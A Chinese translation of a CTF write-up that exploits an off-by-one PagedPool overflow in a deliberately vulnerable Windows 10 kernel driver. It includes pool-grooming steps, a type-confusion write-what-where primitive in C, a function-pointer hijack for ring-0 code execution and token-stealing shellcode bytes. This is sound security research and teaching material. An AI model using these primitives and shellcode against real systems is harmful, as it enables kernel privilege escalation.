# 利用Windows 10 PagedPool off-by-one溢出(WCTF 2018)

阅读量 **235465**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-07-24 12:00:58

 **x**

##### 译文声明

本文是翻译文章，文章原作者 j00ru，文章来源：j00ru.vexillium.org

原文地址：<https://j00ru.vexillium.org/2018/07/exploiting-a-windows-10-pagedpool-off-by-one/>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t014f4b4734f146f609.png)

在7月6-8日的周末，我们的CTF团队-[Dragon
Sector](http://dragonsector.pl/)-参加了在北京举行的一场名为WCTF的邀请赛。 其他参与者是来自世界各地的顶级团队(e.g.
Shellphish, ESPR, LC↯BC or Tokyo Westerns)，
比赛的奖金总额达到了惊人的10万美元。这个CTF的一个特殊的规则是这些挑战是由团队自己而不是组织者准备的。
10个队伍每一队都要求提供两个题目，其中一个要求必须在Windows上运行。允许远程帮助，评分系统提供了一、二、三血加分奖励。在挑战比赛完成之后随之而来的是下一环节，陪审团和参与者在舞台上展示自己的题目时会获得额外的分数。

经过两天的竞争，我们作为CTF的亚军，完成了6/18项挑战任务， 排在冠军Tokyo Westerns (7/18)后面。

![](https://p0.ssl.qhimg.com/t01a948803e282c8de3.png)

我对上述结果的贡献是通过[Eat, Sleep, Pwn,
Repeat](https://twitter.com/EatSleepPwnRpt)拿到“Searchme” 这一题的flag。它涉及利用Windows
10 64位中加载的易受攻击的内核驱动程序造成的PagedPool分配的off-by-one缓冲区溢出。
在CTF之后不久，原作者（@_niklasb）发布了驱动程序的源代码和相应的漏洞（github源码[niklasb/elgoog](https://github.com/niklasb/elgoog/)
、Twitter
上[讨论](https://twitter.com/_niklasb/status/1015889867811770368)），这表示我解法的一部分是非预期的。Niklas
使用off-by-one 来破坏分配元数据并且执行一些 _pool feng-shui_
去得到覆盖的pool块。另一方面，我在没有触及任何pool元数据的情况下，通过 _data-only_ 的攻击实现了类似的结果，这使得整个利用过程更加简单。
我鼓励您仔细分析Niklas的漏洞，如果您对我的方法感兴趣，请继续跟着做。

如果你想直接跳到exploit代码，
在这儿[GitHub](https://gist.github.com/j00ru/2347cf937366e61598d1140c31262b18) 。

## 初步观察

作为任务的一部分，我们提供了一个64位的Windows内核驱动程序，名为 searchme.sys 14kB的大小,有如下描述：

> <ip> 3389 flag is here: c:flag.txt, User:ctf, password:ctf

当我通过RDP连接到远程主机时，我可以作为一个常规的“ctf”用户登录。 searchme.sys
驱动程序被加载到系统中，想要在磁盘上拿到C:flag.txt 文件。但是正如预期那样，这个账户不能安全的读取：

在这一点上，很明显，挑战的目标是在searchme.sys中利用内核模式的漏洞，将权限提升到管理员或系统权限，然后从受保护的文件中读取flag。
当我在IDA Pro中加载这个模块时，我很快就发现它在设备DeviceSearchme 下注册了一个设备，并使用缓冲的[Buffered
I/O](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/using-buffered-i-o) 通信方案操作四个IOCTLs ：

  * `0x222000` – allocates an empty object from PagedPool, saves it in a global array and returns its address to the caller（从PagedPool分配一个空对象，将其保存到全局数组中，并将其地址返回给调用者）
  * 0x222004 – frees a previously allocated object（释放先前分配的对象）
  * `0x222008` – adds a pair of `(char[16], uint32)` to an existing object（将一对（char 16，uint32）添加到现有对象中）
  * `0x22200C` – transforms an existing object of type-0 to type-1 in a one-way, irreversible manner.(以一种单向的、不可逆转的方式将type-0的现有对象转换为type-1)。

由于IOCTLs 和 and #2 是不重要的，该漏洞肯定隐藏在#3或#4的实现中。
我简单地对在驱动程序中找到的整个代码进行了逆向工程（在Redford和impr的帮助下），以掌握它的功能，重命名符号并修复数据类型。
很明显，驱动程序维护了一个哈希映射，将文本字符串与数值列表相关联，而某种类型的二进制数据结构涉及到type-1对象，但是我仍然没有完全理解代码的基本目的(后来证明是
[binary interpolative
code](https://link.springer.com/article/10.1023/A:1013002601898)
).我也没有发现任何明显的利用点，但我注意到两种可疑的行为：

  1. 在处理0x222008时，驱动程序不允许在与字符串标记关联的整数列表中重复。然而，它只检查了新添加的值，而不是在列表后面的那个。 比如：[1，2，2]列表由于相同的连续数而不被允许，但是[2，1，2]可以很好地创建。 考虑到这个列表是在稍后被另一个IOCTL处理的时候排序的，这似乎特别奇怪，这可能会使重复检测的整个点失效。
  2. 在0x22200C处理器调用的嵌套函数中，找到了以下代码结构：

    
    
    if (*cur_buf > buf_end) {
      return 1;
    }
    

​ 假设buf_end是有效缓冲区之外的最小地址,这可能表示一个off-by-one
error，否则比较应该使用>=操作符。因为比较应该另外使用>＝运算符。由于遵循上面讨论的线索可能会耗费大量时间，所以我决定尝试一个更简单的路线，看看我是否能通过愚蠢的Fuzzing来触发任何崩溃。
这将允许我从一个已知的坏状态开始我的分析，而不是在一开始就花费时间搜索内存损坏原函数。

## Fuzzing 驱动程序

在fuzzing的环境下，驱动程序的通信接口被限制为4个简单的操作这个是很方便的，在开发阶段，我围绕`deviceIoControl`创建了几个包装函数，这些函数后来在实际的EXP中被重用。
fuzzer的核心非常简单-它以随机的方式无限地调用一个IOCTLs，但是格式化正确的输入参数(`token=["aa","bb"]`,
`value=[0..9]`). 在为searchme.sys启用[Special Pool](https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/special-pool)并启动fuzzer之后，只需几秒钟就可以在WinDbg中看到以下崩溃：

    
    
    DRIVER_PAGE_FAULT_BEYOND_END_OF_ALLOCATION (d6)
    N bytes of memory was allocated and more than N bytes are being referenced.
    This cannot be protected by try-except.
    When possible, the guilty driver's name (Unicode string) is printed on
    the bugcheck screen and saved in KiBugCheckDriver.
    Arguments:
    Arg1: ffffd9009c68b000, memory referenced
    Arg2: 0000000000000000, value 0 = read operation, 1 = write operation
    Arg3: fffff8026b482628, if non-zero, the address which referenced memory.
    Arg4: 0000000000000000, (reserved)
    
    [...]
    
    TRAP_FRAME:  ffff820b43580360 -- (.trap 0xffff820b43580360)
    NOTE: The trap frame does not contain all registers.
    Some register values may be zeroed or incorrect.
    rax=ffffd9009c68b000 rbx=0000000000000000 rcx=00000000fffffffe
    rdx=0000000000000001 rsi=0000000000000000 rdi=0000000000000000
    rip=fffff8026b482628 rsp=ffff820b435804f8 rbp=0000000000000000
     r8=ffffd9009c68b000  r9=0000000000000000 r10=00007ffffffeffff
    r11=ffff820b435804f0 r12=0000000000000000 r13=0000000000000000
    r14=0000000000000000 r15=0000000000000000
    iopl=0         nv up ei pl zr na po nc
    searchme+0x2628:
    fffff802`6b482628 0fbe00          movsx   eax,byte ptr [rax] ds:ffffd900`9c68b000=??
    

崩溃发生在searchme+0x2628处，处在一个位写入函数—同样具有可以的*cur_buf > buf_end 比较语句。进一步的分析和实验 (e.g.
fuzzing 没有Special Pool的环境) 证实了溢出确实被限制为一个字节 。

就在那时，我灵机一动—-不久之前我看到过类似的代码！在快速的检查之后，结果证明是真的。“searchme” 任务实际上是几个月前从
[34C3](https://archive.aachen.ccc.de/34c3ctf.ccc.ac/) 中对
[elgoog2](https://archive.aachen.ccc.de/34c3ctf.ccc.ac/uploads/elgoog2-5eae901f059d56b3a8415043a0c17956.tar.gz)
修改和重新编译的版本。这个发现的直接好处是“elgoog”任务附带了调试符号，包括结构定义、函数名等等。
在做了更多的调查之后，我发现了[这条推文](https://twitter.com/_niklasb/status/947179509287194624)，它导致了这篇简短的[write-up](https://github.com/niklasb/34c3ctf-sols/tree/master/elgoog)，以及来自shiki7的来自Tea Deliverers的
[exploit](https://gist.github.com/marche147/6e7bb92d376a0f209b1b301aff418e88)
。 “SearchMe”中修补了非计划中的类型混淆bug，因此旧的exploit不再有效，但它仍然提供了一些有价值的见解。
此外，Niklas对Point(1)中的池缓冲区溢出的描述加强了我的信念，即这是要在这里利用的预期的bug。

因此，接下来的一两个小时，我把符号从“elgoog”移到我的“SearchMe”IDA数据库。

## 控制溢出

通过查看fuzzer发送的一系列命令来触发崩溃，我了解到溢出确实是由“compressing”
(IOCTL0x22200C)造成的，该对象包含一个带有重复条目的标记。由于我只能在分配的缓冲区之外写入一个字节，因此很可能需要仔细控制它的值。即使在调试符号的帮助下，我仍然不确定代码构造了什么数据结构，因此—如何精确地控制其内容。

为了避免浪费时间对算法进行深入研究，我无耻地复制了插值函数的大小和写插值函数
(及其依赖项)从十六进制反编译器到VisualStudio，并编写了一个简单的蛮力程序，测试各种随机输入列表的溢出字节。该工具的要点归结为以下几点：

    
    
    // Fill input_buffer with random numbers and sort it.
    
    memset(output_buffer, 0xaa, sizeof(output_buffer));
    char *buf = output_buffer;
    
    write_interpolative(&buf, input_buffer, 1, ARRAYSIZE(input_buffer) - 1);
    
    size_t calculated = (interpolative_size(input_buffer, 1, ARRAYSIZE(input_buffer) - 1) + 7) / 8;
    ptrdiff_t written = buf - output_buffer - 1;
    
    if (written > 0 && calculated > 0 && written > calculated) {
      const char kSearchedByte = 0;
    
      if (output_buffer[calculated] == kSearchedByte) {
        // Print input_buffer.
      }
    }
    

根据所需的值，可以操作input_buffer的长度和输入数字的范围。对于简单的0x00值，只需在[0,9]范围内使用5个数字就可以实现所需的效果：

    
    
    C:> brute.exe
    calculated: 4, written: 11, last byte: 0x00
    input_buffer = {0, 1, 1, 1, 2}
    
    calculated: 1, written: 4, last byte: 0x00
    input_buffer = {0, 3, 4, 5, 5}
    
    calculated: 1, written: 4, last byte: 0x00
    input_buffer = {5, 7, 8, 9, 9}
    
    [...]
    

有了选择溢出我们分配的单个字节的能力，是时候将基元提升到一个更强大的字节了。

## Data-only pool 破坏

如今使用的大多数动态分配器将元数据放在分配的内存块前面，这在历史上促进了许多通用堆利用技术。另一方面，它现在可能会使对小溢出的利用变得困难，因为元数据将特定于应用程序的对象彼此分离，并且常常受到广泛的完整性检查。必须在此提及以下两点参考：
[_A Heap of Trouble: Breaking the Linux Kernel SLOB
Allocator_](https://www.vsecurity.com/download/papers/slob-exploitation.pdf)
(Dan Rosenberg, 2012) and [_The poisoned NUL byte, 2014
edition_](https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html) (Chris Evans and Tavis Ormandy, 2014).

在他的[计划方案](https://github.com/niklasb/elgoog/#intended-solution),
Niklas还使用pool元数据破坏来混淆内核池分配器，因此有两个不同的对象相互重叠，以实现更有用的基元。
这是一种有效的方法，但是它要求开发人员意识到分配器的内部工作原理，并精确地设置pool的布局以保证可靠的开发。
作为个人偏好，我发现攻击特定于程序的对象比内部系统结构更容易，所以我凭直觉开始寻找解决这个问题的方法。

这可能是一个鲜为人知的事实，在Windows内核中，小的分配(适合于单个内存页)的处理方式与大内存页不同 ，对于一些过时但仍然相关的细节， 看
[_Kernel Pool Exploitation on Windows 7_](https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf) (Tarjei Mandt, 2011) and
[_Sheep Year Kernel Heap Fengshui: Spraying in the Big Kids’
Pool_](http://www.alex-ionescu.com/?p=231) (Alex Ionescu, 2014).
在这个特定的例子中，我们感兴趣的是大池块的两个属性：

  * 元数据是分开存储的，所以分配从页面对齐的地址开始，比如`0xffffa803f5892000`。
  * 这些块通常在内存中相邻;例如，两个连续的`0x1000`大小的分配可以分别映射到`0xffffa803f5892000`和`0xffffa803f5893000`

在易受攻击的驱动程序中，我们可以精确地控制溢出的块的大小，直到大小为[0x10000](https://github.com/niklasb/elgoog/blob/master/searchme/index.c#L271)（16页）。
这足以将两个大的对象放在相邻的位置上，我们甚至可以确定相邻区域的精确对，这要归功于IOCTLs明显地返回所创建对象的内核模式地址。
我在CTF期间编写的一个简单工具成功地证实了这一点， 它创建了8个0x2000字节长的索引，并比较了它们的地址。产出与以下内容相似：

    
    
    C:>adjacent.exe
    [+] Source Index: ffffa803f2f79cb0
    [1] Adjacent objects: ffffa803f61db000 --> ffffa803f61dd000
    [2] Adjacent objects: ffffa803f61dd000 --> ffffa803f61df000
    [3] Adjacent objects: ffffa803f61df000 --> ffffa803f61e1000
    [4] Adjacent objects: ffffa803f61e1000 --> ffffa803f61e3000
    [5] Adjacent objects: ffffa803f61e3000 --> ffffa803f61e5000
    [6] Adjacent objects: ffffa803f61e5000 --> ffffa803f61e7000
    [7] Adjacent objects: ffffa803f61e7000 --> ffffa803f61e9000
    

正如您所看到的，所有对象实际上都是在一个连续的0x10000字节块中相互映射的。 如果我们随后释放所有其他对象，在pool中创建 “holes”
，并立即分配一个由驱动程序覆盖的相同大小的新块，那么溢出应该与相邻索引对象的第一个字节重叠。如图所示:

![](https://p4.ssl.qhimg.com/t01cfdee4451f7e7c13.png)

在这一点上，我们应该查看存储在第一字节中的信息类型。事实证明，它是一个32位整数的最小有效字节，它指示对象的类型（type-0规则型，type
-1压缩型）。常规对象的结构定义如下所示 ：

    
    
    struct _inverted_index {
      /* +0x00 */ int compressed;
      /* +0x08 */ _ii_token_table *table;
    };
    

如果压缩成员为非零，则结构的布局非常不同 ：

    
    
    struct _compressed_index {
      /* +0x00 */ int compressed;
      /* +0x04 */ int size;
      /* +0x08 */ int offsets[size];
      /* +0x?? */ char data[...];
    };
    

由于对象的类型为0x00000000或0x00000001，我们的单字节溢出使我们能够将对象的类型从`compressed_index` 改为
`inverted_index` 。 类型混淆有一些方便的基元-在上面的结构中，我们可以看到偏移量8处的表指针与offsets[0] 和offsets[1]
的项重叠。 偏移数组中的值是相对于压缩索引的压缩数据的偏移量，因此它们相对较小。在我们的测试中，它们分别等于0x558和0x56C。

当二者组合并理解为64位地址时 ，这两个值形成了以下指针 ：`0x0000056c00000558`.
它不是常规应用程序中经常看到的典型地址，但它是一个规范的用户模式地址，可以由程序使用简单的Virtualalloc调用。
换句话说，类型混淆允许用户将敏感的内核模式指针重定向到用户空间，并对由驱动程序使用的_II_Token_Table结构进行完全控制。

如果我们在poc中实现了所讨论的逻辑，将对象的类型从1更改为0，然后尝试向损坏的索引中添加一个新的(keyword,
value)对，则在searchme.sys尝试从0x0000056c00000558取消引用内存时，我们应该观察到以下系统崩溃：

    
    
    SYSTEM_SERVICE_EXCEPTION (3b)
    An exception happened while executing a system service routine.
    Arguments:
    Arg1: 00000000c0000005, Exception code that caused the bugcheck
    Arg2: fffff8008b981fea, Address of the instruction which caused the bugcheck
    Arg3: ffff948fa7516c60, Address of the context record for the exception that caused the bugcheck
    Arg4: 0000000000000000, zero.
    
    [...]
    
    CONTEXT:  ffff948fa7516c60 -- (.cxr 0xffff948fa7516c60)
    rax=000000009b82a44c rbx=ffffcc8a26af7370 rcx=0000056c00000558
    rdx=0000000000000000 rsi=ffffcc8a273fc20c rdi=ffff948fa75177d4
    rip=fffff8008b981fea rsp=ffff948fa7517650 rbp=ffffcc8a2876fef0
     r8=0000000000000001  r9=0000000000000014 r10=0000000000000000
    r11=0000000000000000 r12=ffffcc8a2876fef0 r13=ffffcc8a29470180
    r14=0000000000000002 r15=0000000000000000
    iopl=0         nv up ei pl zr na po nc
    cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
    searchme+0x1fea:
    fffff800`8b981fea 48f77108        div     rax,qword ptr [rcx+8] ds:002b:0000056c`00000560=????????????????
    

让我们更仔细地研究受控的 `_ii_token_table` 结构所提供的功能。

## 拿到一个任意写的身份

基于elgoog符号文件，我恢复了_II_Token_table和相关的_II_POST_List结构的原型，并将它们写成以下C定义：

    
    
    struct _ii_posting_list {
      char token[16];
      unsigned __int64 size;
      unsigned __int64 capacity;
      unsigned int data[1];
    };
    
    struct _ii_token_table {
      unsigned __int64 size;
      unsigned __int64 capacity;
      _ii_posting_list *slots[1];
    };
    

在许多方面，上面的数据结构类似于C++中的std：map<string、std：Vector<unsiveint>结构。
当程序请求向索引中添加一个新的(token, value)对时，代码遍历slots
数组以查找与所提供的token相对应的posting列表，一旦找到，输入值将用以下表达式追加到列表中， 并带有以下表达式：

    
    
    PostingList.data[PostingList.size++] = value;
    

考虑到Token表在我们的控制下， `_ii_posting_list.size`
字段是64位宽的，并且我们知道假posting列表的基址，这种行为转换为任意写基元是非常简单的。
首先，我们在静态内存中声明假的posting列表，其中有一个已知的名称(“fake”) 和容量等于`UINT64_MAX`:

    
    
    namespace globals {
    
    _ii_posting_list PostingList = { "fake", 0, 0xFFFFFFFFFFFFFFFFLL };
    
    }  // namespace globals
    

然后，我们编写一个函数来初始化特殊0x0000056c00000558地址的伪token表：

    
    
    BOOLEAN SetupWriteWhatWhere() {
      CONST PVOID kTablePointer = (PVOID)0x0000056c00000558;
      CONST PVOID kTableBase = (PVOID)0x0000056c00000000;
    
      if (VirtualAlloc(kTableBase, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) == NULL) {
        printf("[-] Unable to allocate fake base.n");
        return FALSE;
      }
    
      _ii_token_table *TokenTable = (_ii_token_table *)kTablePointer;
      TokenTable->size = 1;
      TokenTable->capacity = 1;
      TokenTable->slots[0] = &globals::PostingList;
    
      return TRUE;
    }
    

最后，我们添加一个助手函数来触发4字节任意写条件：

    
    
    VOID WriteWhatWhere4(ULONG_PTR CorruptedIndex, ULONG_PTR Where, DWORD What) {
      globals::PostingList.size = (Where - (ULONG_PTR)&globals::PostingList.data) / sizeof(DWORD);
    
      AddToIndex(CorruptedIndex, What, "fake");
    }
    

有了这些，我们就可以测试它的工作原理：

    
    
    WriteWhatWhere4(CorruptedIndex, 0x4141414141414141LL, 0x42424242);
    

这将在易受攻击的驱动程序中触发以下异常：

    
    
    CONTEXT:  ffff9609683dacb0 -- (.cxr 0xffff9609683dacb0)
    rax=00007ff6a90b2930 rbx=ffffe48f8135b5a0 rcx=10503052a60d85fc
    rdx=0000000042424242 rsi=ffffe48f82d7d70c rdi=ffff9609683db7d4
    rip=fffff8038ccc1905 rsp=ffff9609683db6a0 rbp=ffffe48f82c79ef0
     r8=0000000000000001  r9=0000000000000014 r10=0000000000000000
    r11=0000000000000000 r12=ffffe48f82c79ef0 r13=ffffe48f81382ac0
    r14=0000000000000002 r15=0000000000000000
    iopl=0         nv up ei pl nz na po nc
    cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
    searchme+0x1905:
    fffff803`8ccc1905 3954881c        cmp     dword ptr [rax+rcx*4+1Ch],edx ds:002b:41414141`4141413c=????????
    

上面的崩溃日志并不能完全说明“写”操作，因为之前的一些无意义的阅读清单。数据，但攻击是有效的。

## 执行shellcode

在这一点上，我可以写任意的内核内存但是不能读，这就排除了直接从用户模式执行[data-only
attacks](https://improsec.com/blog/data-only-attacks-are-still-alive) 的选项。
然而，使用任意写的基元，执行ring-0 shellcode 应该只是一种形式
。在这种情况下，它变得更容易了，因为这个漏洞是在Medium完整性的情况下运行的，所以它可以访问内核模块的基本地址，并且可以通过NtQuerySystemInformation
的[各种信息类](https://recon.cx/2013/slides/Recon2013-Alex%20Ionescu-I%20got%2099%20problems%20but%20a%20kernel%20pointer%20ain't%20one.pdf)获得其他有用的地址。

在[Black Hat USA 2017
talk](https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update.pdf) 中，Morten
Schenk提出，可以使用任意写入来覆盖驻留在win32kbase.sys
的.Data部分中的内核函数指针，更具体地说，可以覆盖来自NtGdiDdDDI*系列的图形系统使用的win32kbase！gDxgkInterface表中的内核函数指针。
实际上，系统调用处理程序是函数指针的简单包装器，并且不会破坏通过rcx、rdx、…寄存器传递的任何参数。，例如：

![](https://p0.ssl.qhimg.com/t017affc8926ec9426e.png)

这允许攻击者用受控的参数来调用任意的内核函数，并接收返回值。正如Morten所讨论的，完整的利用过程只有几个简单的步骤：

  1. 用`nt!ExAllocatePoolWithTag`地址覆盖函数指针。
  2. 使用非`PagedPool`参数调用例程来分配可写/可执行内存。
  3. 将ring-0 shellcode 写入分配的内存
  4. 用shellcode的地址覆盖函数指针。
  5. 调用shellcode.

上述方案使得能够在不破坏系统状态的情况下干净地执行所需的payload(除了一个覆盖的指针)。在他的论文中，Morten建议使用NtGdiDdDDICreateAllocation作为代理SysCall，
但是我发现它在Windows中的使用非常频繁，如果指针没有及时修复，系统就会出现故障。为了让我的生活更轻松一点，我选择了一种使用频率较低的服务，它似乎完全被我的exploit所调用：`NtGdiDdDDIGetContextSchedulingPriority`.

在实现代码中的逻辑之后，我可以享受任意的内核代码执行——在本例中，一个单独的int3指令：

    
    
    kd> g
    Break instruction exception - code 80000003 (first chance)
    ffffc689`b8967000 cc              int     3
    
    0: kd> u
    ffffc689`b8967000 cc              int     3
    ffffc689`b8967001 c3              ret
    [...]
    
    0: kd> !pool @rip
    Pool page ffffc689b8967000 region is Nonpaged pool
    *ffffc689b8967000 : large page allocation, tag is ...., size is 0x1000 bytes
            Owning component : Unknown (update pooltag.txt)
    

## 提权

在Windows中，提高系统权限的一种更简单的方法是“窃取”系统进程的安全Token并将其复制到当前进程(特别是EPROCESS.Token)。
系统进程的地址可以在ntoskrnl.exe映像的静态内存中找到，位于nt!PsInitialSystemProcess 下面。
由于攻击只涉及在两个内核结构之间复制一个指针，shellcode 只包含六个指令：

    
    
    // The shellcode takes the address of a pointer to a process object in the kernel in the first
    // argument (RCX), and copies its security token to the current process.
    //
    // 00000000  65488B0425880100  mov rax, [gs:KPCR.Prcb.CurrentThread]
    // -00
    // 00000009  488B80B8000000    mov rax, [rax + ETHREAD.Tcb.ApcState.Process]
    // 00000010  488B09            mov rcx, [rcx]
    // 00000013  488B8958030000    mov rcx, [rcx + EPROCESS.Token]
    // 0000001A  48898858030000    mov [rax + EPROCESS.Token], rcx
    // 00000021  C3                ret
    CONST BYTE ShellcodeBytes[] = "x65x48x8Bx04x25x88x01x00x00x48x8Bx80xB8x00x00x00"
                                  "x48x8Bx09x48x8Bx89x58x03x00x00x48x89x88x58x03x00"
                                  "x00xC3";
    

## Getting the flag

一旦替换了工具过程的安全token，我们就可以完全控制操作系统。我们可以启动一个提升的命令提示符并读取flag：

总而言之，在大约15个小时的工作之后，这个exploit已经发挥了作用，并为我们的一（也是最后一个）血奖金提供了120分+30分。
感谢Niklas创造了这个有趣的挑战，也感谢WCTF组织者举办了这次比赛。我认为这个任务和它的解决方案巧妙地说明了即使在今天，从理论上讲，在适当的环境条件下，在内核池中出现的小错误，例如在内核池中溢出的bug可能在概念上很容易被利用。在Windows中，缓冲区溢出的利用还没有死。:)

提醒，该exploit的完整源代码可以在[GitHub](https://gist.github.com/j00ru/2347cf937366e61598d1140c31262b18)上找到。

审核人：yiwang 编辑：边边

本文翻译自j00ru.vexillium.org
[原文链接](https://j00ru.vexillium.org/2018/07/exploiting-a-windows-10-pagedpool-off-by-one/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **veams** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/152341](/post/id/152341)

安全客 - 有思想的安全新媒体

本文转载自: [j00ru.vexillium.org](https://j00ru.vexillium.org/2018/07/exploiting-a-windows-10-pagedpool-off-by-one/)

如若转载,请注明出处： <https://j00ru.vexillium.org/2018/07/exploiting-a-windows-10-pagedpool-off-by-one/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [off-by-one](/tag/off-by-one)
  * [PagedPool](/tag/PagedPool)
  * [WCTF黑客](/tag/WCTF黑客)
  * [Niklas漏洞](/tag/Niklas漏洞)

 **+1** __0赞

 __收藏

![](https://p1.ssl.qhimg.com/t01f66aae07bb1b90cb.jpg) veams

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

